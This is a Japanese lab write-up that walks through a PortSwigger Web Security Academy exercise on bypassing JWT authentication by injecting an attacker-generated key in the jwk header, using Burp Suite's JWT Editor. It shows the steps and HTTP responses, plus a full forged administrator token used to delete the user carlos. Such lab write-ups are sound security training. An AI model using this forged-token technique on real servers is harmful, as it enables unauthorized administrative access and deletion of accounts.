# jwk ヘッダーインジェクションによる JWT 認証バイパス

次のハッキングラボを実施  
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection  
このラボでは、セッションの処理に JWT ベースのメカニズムを使用します。サーバーは、jwkJWT ヘッダーのパラメーターをサポートします。これは、正しい検証キーをトークンに直接埋め込むために使用されることがあります。ただし、提供されたキーが信頼できるソースからのものであるかどうかは確認できません。

- 1. BurpSuite を起動して、Proxy タブからブラウザを立ち上げます

* 2. BurpSuite の拡張機能で JWT Editor をインストールします

- 3. ブラウザからハッキングラボにアクセスします
- 4. 一般ユーザーでログインします

* 5. GET /my-account?id=wiener HTTP/2 リクエストを send to repeater します
* 6. GET /admin に変更してリクエストを送信します。  
     administrator じゃないと admin ページが利用できません。

```
HTTP/2 401 Unauthorized
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2614
```

- 7. JWT Editor key タブを選択して、New RSA key 押下します
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/7537741e-403d-4c99-8fda-1e819d7cb55d)

- 8. Generate 押下し、OK 押下します
     ![2](https://github.com/pea-sys/web-security-experiments/assets/49807271/0fd041ab-878f-4418-b70c-21834e3888ce)

- 9. Repeater タブを選択し、jwt の sub ペイロードを administrator に変更します
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/333dfcce-9f33-46c2-ad8c-bd32c8e129a5)

- 10. Atack 押下し、Embededd JWK を選択します
- 11. リクエストを送信すると管理者ページが利用可能になります

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3138
・
<a href="/admin/delete?username=carlos">Delete</a>
・
```

- 12. 一般ユーザーの削除リンクにアクセスすると削除できます

```
GET /admin/delete?username=carlos HTTP/2
Host: 0a10008b04d1417d82cb7e9300fa00bb.web-security-academy.net
Cookie: session=eyJraWQiOiI3Y2IxYmU5NS02Mjc5LTQ4ZWUtYjUyNS1mZDAzMzM1YzM3YTciLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IjdjYjFiZTk1LTYyNzktNDhlZS1iNTI1LWZkMDMzMzVjMzdhNyIsIm4iOiJ6Z250czFjbENSa2JTTmNUVnVoZE4talJDRW5RT0xtdExfUFZRQlJNaXp4UGZocUxsWFlxODZtY01yTnA2V01wS25Zb09GaGtLYlQzNFJsNUVxeUNQc3lyOEhGQVhhc28ycEFsWEdUbU1VbmcybFlPaHE3TkV2eGdndlZaeTVvdERCd2haSUVBelJYOENwVnhjanJDbzRhMzhNdXhIZFBjZ3BwZTN3aklmLTM3Rm83RDZuV2Y3XzA2SVIzeXVHeGEwcUFFal9DWGx2SUhPMTZwUGJuUnBBY3RpSkUzeEZZUjU2ekl0azBCQno3cURtUW55NEszd2hJQWM1RE9sOTlJRDNEVEpUVS1zVlZFVks1N2oyNlRCb3k1bmVsWWdyMmVTYlg0Z3BjX0R1ZnRMaFNzZkF4Q2FzeDRUTG1DVE91SnYxY0hfUGxuZ01nVmtpQ0hwQmlmNHcifX0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2OTI0MDIzMzF9.yjG4IGmUuUKmkAZnQfyjfW8oWQU9mM0TaVql3oOESQoZpaqeFW0Gh_mRPZz_J28AocDCRTdN-TPtV8814XV1JzLWX4JKMai7O2dothgBq26CQKfgt25_e2sIaQAdC8omNd38HaP0AtLWpsWKk8N-pRIb2zCJ47se9_opDqeTXOQt99ISsijszHA3kI9iHM3G6Flm-Mo5s-OlXsS7DxNbW_UGdhOGyFcplaNhprfvSTKB86-w-iR-_hmSJuw36SbTyAHpMlBq5fFDTlXgiI0hbQxbymGxm7p4kxfzZMJ5iCxHZQm7gp-wqZkxct0ajkHdOP_Fgl0UHuwCixuCFYDv2w
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua:
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Referer: https://0a10008b04d1417d82cb7e9300fa00bb.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8


```

レスポンス

```
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0


```
